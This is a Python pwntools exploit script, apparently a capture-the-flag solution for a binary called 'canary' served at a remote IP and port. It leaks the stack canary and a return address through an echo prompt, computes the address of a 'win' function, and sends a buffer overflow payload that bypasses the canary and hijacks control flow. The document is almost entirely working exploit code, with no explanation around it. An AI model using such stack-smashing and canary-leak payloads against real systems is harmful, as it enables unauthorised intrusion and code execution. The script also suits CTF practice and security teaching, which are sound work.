from pwn import *

context.binary = binary = "./canary"
context.terminal = ["tmux", "splitw", "-h", "-F" "#{1102141}", "-P"]

vuln_elf = ELF(binary)
vuln_rop = ROP(vuln_elf)
# libc = ELF(vuln_elf.runpath+b'/libc.so.6')

gs = """
b *start
c 
"""


def start():
    if args.GDB:
        return gdb.debug(vuln_elf.path, gdbscript=gs)
    else:
        return process(vuln_elf.path)


def send(payload, newline=True):
    if newline:
        p.sendlineafter(b"echo: ", payload)
    else:
        p.sendafter(b"echo: ", payload)


def read():
    return p.recvline().strip()


# p = start()
p = remote("34.93.122.90", 6666)


p.sendlineafter("2): ", b"3")


# Overwrite one byte of canary
send(cyclic(104) + b"A", newline=False)
data = read()
canary = u64(data[105:112].rjust(8, b"\x00"))
log.info(f"Canary: {hex(canary)}")

# Get main+43
send(cyclic(120), newline=False)
data = read()
main43 = u64(data[120:].ljust(8, b"\x00"))
log.info(f"Main+43: {hex(main43)}")

win = main43 - 296
log.info(f"Win: {hex(win)}")

# Call win @ mian43 - 296
send(cyclic(104) + p64(canary) + cyclic(8) + p64(win), newline=False)

p.interactive()
